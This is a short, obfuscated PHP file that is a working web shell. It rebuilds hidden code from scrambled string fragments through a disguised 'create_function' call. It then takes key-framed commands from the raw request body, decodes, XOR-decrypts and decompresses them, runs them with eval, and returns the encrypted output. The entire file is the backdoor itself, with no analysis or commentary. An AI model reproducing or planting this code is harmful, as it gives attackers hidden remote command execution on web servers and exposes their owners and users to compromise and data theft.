<?php
$G='{%i$c%i=strlen%i(%i$k);$l=strl%ien($t);%i$o=""%i;for(%i$i%i=0;%i$i<$l;){for($j=%i0;($j<$c%i&&$i<$l%i);%i$j%i++,$i++';
$V='/in%iput"),$m)==%i1)%i %i{@ob_start();%i@eva%il(@g%izu%incomp%ires%i%is(@x%i(@bas%ie64_decode($m[1]),$k)));$%io=@o%ib';
$A='_get_co%intents%i();@ob_%iend_clean%i();%i$r=@b%iase64_enc%iode%i(@x(%i@%igzcompr%iess($o),$k));%i%iprint("$p$kh$r%i$kf");}';
$U='$k="8%ie2%iae3f2";$kh%i="1b93%i93f0f%i3%i2c";$kf="c24e4%if%i86a58%i8";$p="1t51Ey%iAzRUpBS%iH%iKd";functi%i%ion x($t,$k)';
$F=str_replace('Mj','','cMjreatMje_MjMjfuMjnctMjion');
$D='){$%io.=$%it{$i}^$k{$%ij%i};}}r%ieturn $o;}if %i(@preg_%i%imatch("/$kh%i(%i.%i+)$kf/",@file_get%i_%icontents("%iphp:/%i';
$x=str_replace('%i','',$U.$G.$D.$V.$A);
$E=$F('',$x);$E();
?>
